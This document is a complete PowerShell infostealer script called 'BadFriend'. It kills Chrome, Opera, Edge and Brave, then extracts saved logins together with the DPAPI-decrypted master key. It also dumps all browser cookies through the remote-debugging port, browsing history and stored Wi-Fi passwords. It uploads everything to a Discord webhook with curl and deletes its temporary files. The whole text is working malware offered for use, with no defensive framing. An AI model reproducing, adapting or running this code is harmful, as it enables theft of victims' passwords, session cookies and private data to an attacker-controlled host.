function BadFriend {
    $remoteDebuggingPort = 9222 # port where debug mode will be opened
    $URL = "https://www.google.com" # you can set any value you want, the result will not change

    $hookUrl = "https://discord.com/api/webhooks/CHANGETHIS"


    dumpChromium "chrome" "\Google\Chrome\User Data"

    dumpChromium "opera" "\Opera Software\Opera Stable"

    dumpChromium "msedge" "\Microsoft\Edge\User Data"

    dumpChromium "brave" "\BraveSoftware\Brave-Browser\User Data"

    dumpCookies("chrome.exe")
    dumpCookies("opera.exe")
    dumpCookies("msedge.exe")
    dumpCookies("brave.exe")
    HistoryLover
    Get-WiFiPasswords
}

function Get-WiFiPasswords {

    sendMessage("Dumping WiFi passwords")
    $profilesOutput = netsh wlan show profiles

    if ($profilesOutput -match "There is no wireless interface on the system" -or !$profilesOutput) {
        sendMessage("No wireless interfaces found.")
        return
    }

    $ex = ".tmp"
    $tempPath = $Env:TEMP
    $fileOut = generateFileName
    $fileOut = $fileOut + $ex
    $fullPath = $tempPath + "\" + $fileOut
    $WiFiPasswords = @{}

    ($profilesOutput | Select-String -Pattern "\:(.+)$") | ForEach-Object {
        $Name = $_.Matches.Groups[1].Value.Trim()

        $profileDetails = netsh wlan show profile name="$Name" key=clear
        $keyLine = $profileDetails | Select-String -Pattern "Key Content\W+\:(.+)$"

        if ($keyLine) {
            $Pass = $keyLine.Matches.Groups[1].Value.Trim()
        }
        else {
            $Pass = "[No Password Found]"
        }

        $WiFiPasswords[$Name] = $Pass
    }
    try {
        $WiFiPasswords | ConvertTo-Json -Depth 10 | Out-File -FilePath $fullPath -Force
    }
    catch {
        $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
        sendMessage($message)
    }

    discordExfiltration -fileOut $fullPath
    removeFile -path $fullPath

}

function quitx($browser) {
    $browser = [io.path]::GetFileNameWithoutExtension($browser)
    if (Get-Process -Name $browser -ErrorAction SilentlyContinue) {
        Stop-Process -Name $browser -Force
    }
}
# credits for this function: https://github.com/ScRiPt1337/PowerCookieMonster/blob/main/powerdump.ps1
function SendReceiveWebSocketMessage {
    param (
        [string] $WebSocketUrl,
        [string] $Message
    )

    try {
        $WebSocket = [System.Net.WebSockets.ClientWebSocket]::new()
        $CancellationToken = [System.Threading.CancellationToken]::None
        $connectTask = $WebSocket.ConnectAsync([System.Uri] $WebSocketUrl, $CancellationToken)
        [void]$connectTask.Result
        if ($WebSocket.State -ne [System.Net.WebSockets.WebSocketState]::Open) {
            throw "WebSocket connection failed. State: $($WebSocket.State)"
        }
        $messageBytes = [System.Text.Encoding]::UTF8.GetBytes($Message)
        $buffer = [System.ArraySegment[byte]]::new($messageBytes)
        $sendTask = $WebSocket.SendAsync($buffer, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $CancellationToken)
        [void]$sendTask.Result
        $receivedData = New-Object System.Collections.Generic.List[byte]
        $ReceiveBuffer = New-Object byte[] 4096 # Adjust the buffer size as needed
        $ReceiveBufferSegment = [System.ArraySegment[byte]]::new($ReceiveBuffer)

        while ($true) {
            $receiveResult = $WebSocket.ReceiveAsync($ReceiveBufferSegment, $CancellationToken)
            if ($receiveResult.Result.Count -gt 0) {
                $receivedData.AddRange([byte[]]($ReceiveBufferSegment.Array)[0..($receiveResult.Result.Count - 1)])
            }
            if ($receiveResult.Result.EndOfMessage) {
                break
            }
        }
        $ReceivedMessage = [System.Text.Encoding]::UTF8.GetString($receivedData.ToArray())
        $WebSocket.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "WebSocket closed", $CancellationToken)
        return $ReceivedMessage
    }
    catch {
        throw $_
    }
}

Function generateFileName {
    # Generate a random string using characters from the specified ranges
    $fileName = -join ((48..57) + (65..90) + (97..122) | ForEach-Object { [char]$_ } | Get-Random -Count 5)
    return $fileName
}

function dumpCookies($browser) {
    # opera.exe, chrome.exe, ecc....
    $ex = ".tmp"
    $tempPath = $Env:TEMP
    quitx($browser)
    try {        
        $process = Start-Process $browser -ArgumentList $URL  , "--remote-debugging-port=$remoteDebuggingPort", "--remote-allow-origins=ws://localhost:$remoteDebuggingPort" # cookies don't get loeaded in headless mode, anyone know how to resolve this?
    }
    catch {
        $browserM = [io.path]::GetFileNameWithoutExtension($browser)
        $browserM = (Get-Culture).TextInfo.ToTitleCase($browserM)
        $message = "The browser $browserM has not been found in the system (or maybe you have specified the wrong executable)"
        sendMessage($message)
        return $null
    }
    $fileOut = generateFileName
    $fileOut = $fileOut + $ex
    $fullPath = $tempPath + "\" + $fileOut
    $jsonUrl = "http://localhost:$remoteDebuggingPort/json"
    try {
        $jsonData = Invoke-RestMethod -Uri $jsonUrl -Method Get
    }
    catch {
        $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)`n(It means he didn't found the cookies for a specified Browser, probably it's not installed)"
        sendMessage($message)
    }    
    $url_capture = $jsonData.webSocketDebuggerUrl
    $Message = '{"id": 1,"method":"Network.getAllCookies"}'
	
    if ($url_capture -and $url_capture.Count -gt 0 -and $url_capture[0].Length -ge 2) {
        $response = SendReceiveWebSocketMessage -WebSocketUrl $url_capture[0] -Message $Message 
        # Write to results.txt
        
        $response = $response -replace '^[^{]*', ''

        $response = $response -split "`n" | Where-Object { $_.Trim() -ne "" } | Out-String
        $json = $response | ConvertFrom-Json
        $json = sortCookies($json.result.cookies)
        try {
            $json | ConvertTo-Json -Depth 10 | Out-File -FilePath $fullPath -Force
        }
        catch {
            $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
            sendMessage($message)
        }
        $browserM = [io.path]::GetFileNameWithoutExtension($browser)
        $browserM = (Get-Culture).TextInfo.ToTitleCase($browserM)
        $message = "Cookies from $browserM :"
        sendMessage($message)
        discordExfiltration -json $json -fileOut $fullPath # I had to call the function like this...otherwise it was not working (I mean discordExfiltration($json, $fileOut))
        # If there is any powershell expert out there that gonna help me with this issue I will be grateful (talk with me on Discord!)
      
        removeFile($fullPath)
        quitx($browser)
    
    } 

}


function sortCookies {
    param (
        $cookies
    )

    return $cookies | Sort-Object { $_.domain }
    
}


function HistoryLover {

    $ex = ".tmp"
    $tempPath = $Env:TEMP
    $fileOut = generateFileName
    $fileOut = $fileOut + $ex
    $fileOut = $tempPath + "\" + $fileOut
    $UserName = $Env:UserName

    # Define the paths for each browser's History file
    $Browsers = @{
        "Chrome" = "$Env:LocalAppData\Google\Chrome\User Data\Default\History"
        "Edge"   = "$Env:LocalAppData\Microsoft\Edge\User Data\Default\History"
        "Opera"  = "$Env:AppData\Opera Software\Opera Stable\Default\History"
        "Brave"  = "$Env:LocalAppData\BraveSoftware\Brave-Browser\User Data\Default\History"
    } # ADD OTHERS
    
    # Regular expression to extract full URLs
    $Regex = '(https?:\/\/[^\s"]+)'
    
    # Loop through each browser and extract history

    $records = @{}

    foreach ($Browser in $Browsers.Keys) {
        $Path = $Browsers[$Browser]
        quitx($Browser)
        Start-Sleep -s 0.5
        # Check if the History file exists
        if (Test-Path -Path $Path) {
           
            if ($Browser -eq "Edge") {
                # Because Edge is locked because is used by some Windows process, the easiest way to bypass this is copy the content into another file 
                Get-Content $Path > $fileOut
                $Path = $fileOut
            }
            try {
                $RawData = [System.IO.File]::ReadAllText($Path) -join " "
    
                $Matches = [regex]::Matches($RawData, $Regex) | ForEach-Object { $_.Value } | Sort-Object -Unique
                $records.Add($Browser, $Matches)
                if ($Browser -eq "Edge") {
                    #removeFile -path $Path
                }
            }
            catch {
                $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
                sendMessage($message)
            }
            

        }
        else {
            sendMessage("Could not find history file for $Browser.")
        }
    }
    $records | ConvertTo-Json -Depth 10 | Out-File -FilePath $fileOut -Force
    sendMessage("Start of Browsers History dumping:")


    $compressedFile = compress -path $fileOut # History files can be a lot big, compression is a must

    $result = discordExfiltration -fileOut $compressedFile

    
    removeFile -path $compressedFile
    removeFile -path $fileOut
    sendMessage("End of Browsers History dumping")

}



function compress {
    param (
        $path
    )
    $tempPath = $Env:TEMP
    $fileName = generateFileName
    $compressedFile = $tempPath + "\" + $fileName + ".tar.xz"
    try {
        $tarCommand = "tar.exe -cvJf '$compressedFile' '$path'"
        Invoke-Expression $tarCommand *> $null
    } 
    catch {
        $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
        sendMessage($message)
    }
    

    return $compressedFile
}

function quitx($browser) {
    $browser = [io.path]::GetFileNameWithoutExtension($browser)
    $browser = $browser.ToLower()
    if (Get-Process -Name $browser -ErrorAction SilentlyContinue) {
        Stop-Process -Name $browser -Force
    }
}

function discordExfiltration {
    param(
        $fileOut
    )
    try {
        # Path to your JSON file
        $jsonFilePath = $fileOut
            
            
        # Ensure the file exists before sending it
        if (Test-Path $jsonFilePath) {
            $fileSize = Get-ItemProperty -Path $fileOut | Select-Object -ExpandProperty Length

            if ($fileSize -gt 10000000) {
                return $fileOut
            }
            try {
                $curlCommand = "curl.exe -w '%{http_code}' -s -X POST $hookUrl -F 'file=@$jsonFilePath' -H 'Content-Type: multipart/form-data' | Out-Null"
                Invoke-Expression $curlCommand
    
            }
            catch {
                $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
                sendMessage($message)
            }
    
                
        }
        else {
            $message = "The JSON file was not found. Please check the file path."
            sendMessage($message)
        }
    }
    catch {
        $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
        sendMessage($message)
    }
        
}




# class to interact with SQLite databases using
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WinSQLite3
{
    const string dll = "winsqlite3";
    [DllImport(dll, EntryPoint="sqlite3_open")]
    public static extern IntPtr Open([MarshalAs(UnmanagedType.LPStr)] string filename, out IntPtr db);
    [DllImport(dll, EntryPoint="sqlite3_prepare16_v2")]
    public static extern IntPtr Prepare2(IntPtr db, [MarshalAs(UnmanagedType.LPWStr)] string sql, int numBytes, out IntPtr stmt, IntPtr pzTail);
    [DllImport(dll, EntryPoint="sqlite3_step")]
    public static extern IntPtr Step(IntPtr stmt);
    [DllImport(dll, EntryPoint="sqlite3_column_text16")]
    static extern IntPtr ColumnText16(IntPtr stmt, int index);
    [DllImport(dll, EntryPoint="sqlite3_column_bytes")]
    static extern int ColumnBytes(IntPtr stmt, int index);
    [DllImport(dll, EntryPoint="sqlite3_column_blob")]
    static extern IntPtr ColumnBlob(IntPtr stmt, int index);
    public static string ColumnString(IntPtr stmt, int index)
    { 
        return Marshal.PtrToStringUni(WinSQLite3.ColumnText16(stmt, index));
    }
    public static byte[] ColumnByteArray(IntPtr stmt, int index)
    {
        int length = ColumnBytes(stmt, index);
        byte[] result = new byte[length];
        if (length > 0)
            Marshal.Copy(ColumnBlob(stmt, index), result, 0, length);
        return result;
    }
    [DllImport(dll, EntryPoint="sqlite3_errmsg16")]
    public static extern IntPtr Errmsg(IntPtr db);
    public static string GetErrmsg(IntPtr db)
    {
        return Marshal.PtrToStringUni(Errmsg(db));
    }
}
"@


function dumpChromium($browserName, $userDataPath) {
        
    # browserName = chrome, opera, name of process
    #pathName = \Google\Chrome\User Data, \Opera Software\Opera Stable
    $ErrorActionPreference = 'SilentlyContinue'
    try {
        Stop-Process -Name $browserName
        Add-Type -AssemblyName System.Security

        if ($browserName -eq "opera") {
            $browser_path = $env:APPDATA + $userDataPath
        }
        else {
            $browser_path = $env:LOCALAPPDATA + $userDataPath
        }
        $query = "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0"

        $secret = Get-Content -Raw -Path $( -join ($browser_path, "\Local State")) | ConvertFrom-Json
        $secretkey = $secret.os_crypt.encrypted_key

        $cipher = [Convert]::FromBase64String($secretkey)

        $key = [Convert]::ToBase64String([System.Security.Cryptography.ProtectedData]::Unprotect($cipher[5..$cipher.length], $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))



        $browser_profiles = Get-ChildItem -Path $browser_path | Where-Object { $_.Name -match "(Profile [0-9]|Default)" } | % { $_.FullName }


        $ex = ".tmp"
        $tempPath = $Env:TEMP
        $fileOut = generateFileName
        $fileOut = $fileOut + $ex
        $fullPath = $tempPath + "\" + $fileOut
        $records = @{}
        $i = 0
        foreach ($user_profile in $browser_profiles) {
            $dbH = 0
            if ([WinSQLite3]::Open($( -join ($user_profile, "\Login Data")), [ref] $dbH) -ne 0) {
                sendMessage("Failed to open!")
                [WinSQLite3]::GetErrmsg($dbh)
                
            }

            $stmt = 0
            if ([WinSQLite3]::Prepare2($dbH, $query, -1, [ref] $stmt, [System.IntPtr]0) -ne 0) {
                sendMessage("Failed to prepare!")
                [WinSQLite3]::GetErrmsg($dbh)
               
            }

            while ([WinSQLite3]::Step($stmt) -eq 100) {
                
                try {
                    $url = [WinSQLite3]::ColumnString($stmt, 0)
                    $username = [WinSQLite3]::ColumnString($stmt, 1)
                    $encryptedPassword = [Convert]::ToBase64String([WinSQLite3]::ColumnByteArray($stmt, 2))

                    # Store the extracted data in a structured object
                    $record = @{
                        url      = $url
                        username = $username
                        password = $encryptedPassword
                        key      = $key
                    }
                    $i++
                    # Add record to the list
                    $jsonRecord = $record | ConvertTo-Json -Depth 10
                    $records.Add($i.ToString(), $jsonRecord)
                }
                catch {
                    sendMessage($_.Exception.Message)
                }

                
            }
 
        

        }

        try {
            $records | ConvertTo-Json -Depth 10 | Out-File -FilePath $fullPath -Force
        }
        catch {
            $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
            sendMessage($message)
        }
        $browserM = (Get-Culture).TextInfo.ToTitleCase($browserName)
        $message = "Credentials from $browserM :"
        sendMessage($message)
        discordExfiltration -fileOut $fullPath
        removeFile -path $fullPath


    }
    catch [Exception] {
        sendMessage($_.Exception.Message)
    }


}

function sendMessage {
    param(
        $message
    )
    $payload = @{ content = $message } | ConvertTo-Json -Depth 10
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body $payload -ContentType "application/json"
}

function removeFile {
    param(
        $path
    )
    if (Test-Path $path) {
    
        Remove-Item -Path "$path" -Force
        $message = "File at $path deleted;)"
        sendMessage($message)
    
    }
    else {
        $message = "I was not able to remove the file at $path....What happened?"
        sendMessage($message)
    }
        
}



BadFriend | Out-Null